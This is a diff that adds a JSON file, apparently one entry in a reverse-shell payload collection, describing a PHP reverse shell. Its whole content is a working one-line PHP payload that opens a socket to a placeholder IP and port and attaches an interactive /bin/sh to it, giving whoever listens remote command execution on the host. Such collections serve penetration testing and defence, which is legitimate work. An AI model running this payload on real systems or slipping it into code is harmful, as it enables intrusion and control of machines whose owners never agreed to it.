@@ -1,0 +1,10 @@
+{
+  "data": {
+    "information": {
+      "description": "use PHP sockets to open a reverse shell",
+      "type": "reverse",
+      "exec": "php"
+    },
+    "payload": "$sock=fsockopen(\"[IP]\",[PORT]);exec(\"/bin/sh -i <&3 >&3 2>&3\");"
+  }
+}
